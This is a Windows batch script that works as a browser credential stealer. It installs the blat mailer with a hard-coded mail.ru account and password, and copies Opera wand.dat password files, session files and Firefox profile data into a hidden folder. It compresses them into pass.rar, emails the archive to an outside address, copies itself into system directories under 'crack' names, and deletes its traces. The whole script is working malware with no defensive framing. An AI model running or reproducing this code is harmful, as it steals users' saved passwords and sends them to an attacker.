cd %SYSTEMROOT%/system32
blat.exe -install -server smtp.mail.ru -port 25 -f maxafter@mail.ru -u maxafter -pw sirelis >nul
md C:\atakama
set amatory=cd c:\
set amt=cd %APPDATA%\Opera\Opera
set black_day=C:\atakama
set I_remain=rd C:\atakama /s /q
cd %APPDATA%\Opera\Opera\profile\ >nul
copy wand.dat %black_day% >nul
cd %APPDATA%\Opera\Opera\profile\sessions
copy autosave.win C:\atakama
copy autosave.win.bak C:\atakama
cd %APPDATA%\Opera\Opera 10 Preview!\profile\ >nul
copy wand.dat %black_day% >nul
cd %ProgramFiles%\Opera AC 3.7\profile
copy wand.bat %black_day% >nul
cd %APPDATA%\Mozilla\Firefox\Profiles\9vf96daw.default\
copy wand.bat %black_day% >nul
cd %APPDATA%\Mozilla\Firefox\
copy profiles.ini %black_day% >nul
cd C:\atakama
"C:\Program Files\WinRAR\WinRAR.exe" u -r -y -ep1 C:\atakama\pass.rar *.*
blat.exe -subject "00" -body "Go" -to maxafter@mail.ru -attach C:\atakama\pass.rar >nul
copy %0 %systemroot%\amatory_crack.bat >nul
copy %0 %systemroot%\system32\[amatory]_crack.bat
reg delete "Hklm\SOFTWARE\Public Domain" /f
%I_remain%